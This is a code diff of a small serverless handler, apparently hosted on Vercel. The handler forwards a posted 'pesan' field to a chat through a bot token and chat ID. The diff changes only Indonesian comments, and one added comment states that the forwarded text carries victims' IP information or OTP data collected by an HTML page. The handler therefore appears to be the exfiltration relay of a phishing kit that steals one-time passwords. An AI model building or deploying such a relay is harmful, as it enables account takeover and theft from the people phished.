@@ -4,9 +4,10 @@ export default async function handler(req, res) {
         return res.status(405).json({ message: 'Method Not Allowed' });
     }
 
+    // Mengambil data properti "pesan" yang dikirim oleh sendTelegramMessage() dari HTML
     const { pesan } = req.body;
     
-    // Memanggil Environment Variables yang sudah diatur di pengaturan hosting
+    // Memanggil Environment Variables dari dashboard Vercel
     const botToken = process.env.BOT_TOKEN;
     const chatId = process.env.CHAT_ID;
 
@@ -22,7 +23,7 @@ export default async function handler(req, res) {
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 chat_id: chatId,
-                text: pesan,
+                text: pesan, // Teks otomatis berisi info IP atau data OTP yang dibuat di HTML sayang
                 parse_mode: 'html'
             })
         });
